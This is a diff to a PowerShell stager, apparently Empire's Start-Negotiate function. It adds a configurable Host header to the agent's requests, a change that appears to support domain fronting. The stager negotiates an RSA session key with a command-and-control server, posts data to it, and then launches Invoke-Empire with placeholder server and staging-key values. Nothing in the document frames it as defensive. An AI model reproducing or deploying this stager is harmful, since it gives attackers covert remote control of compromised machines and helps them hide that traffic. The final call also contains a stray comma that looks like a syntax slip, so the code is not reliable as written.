@@ -1,7 +1,7 @@
 function Start-Negotiate{
     # param($s,$SK,$UA="Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko")
-    param($s,$SK,$UA="lol")
-    
+    param($s,$SK,$UA="lol",$H)
+
     # make sure the appropriate assemblies are loaded
     Add-Type -assembly System.Security;
     Add-Type -assembly System.Core;
@@ -19,7 +19,7 @@ function Start-Negotiate{
     $csp = New-Object System.Security.Cryptography.CspParameters;
     $csp.Flags = $csp.Flags -bor [System.Security.Cryptography.CspProviderFlags]::UseMachineKeyStore;
     $rs = New-Object System.Security.Cryptography.RSACryptoServiceProvider -ArgumentList 2048,$csp;
-    
+
     # export the public key in the only format possible...stupid
     $rk=$rs.ToXmlString($False);
     $r=1..16|ForEach-Object{Get-Random -max 26};
@@ -43,6 +43,7 @@ function Start-Negotiate{
     }
     # the User-Agent always resets for multiple calls...silly
     $wc.Headers.Add("User-Agent",$UA);
+    $wc.Headers.Add("Host",$H);
 
     # add in the session ID cookie
     $wc.Headers.Add("Cookie","SESSIONID=$ID");
@@ -89,6 +90,7 @@ function Start-Negotiate{
 
     # the User-Agent always resets for multiple calls...silly
     $wc.Headers.Add("User-Agent",$UA);
+    $wc.Headers.Add("Host",$H);
 
     # post the data back to the C2 server
     $raw=$wc.UploadData($s+"index.php","POST",$eb2);
@@ -107,4 +109,4 @@ function Start-Negotiate{
 
     # TODO: remove this shitty $server logic
     Invoke-Empire -Servers @(($s -split "/")[0..2] -join "/") -SessionKey $key -SessionID $ID -Epoch $epoch;
-} Start-Negotiate -s "REPLACE_SERVER" -SK 'REPLACE_STAGING_KEY' -UA $u;
+} Start-Negotiate -s "REPLACE_SERVER" -SK 'REPLACE_STAGING_KEY' -UA $u, -H 'REPLACE_HOST';
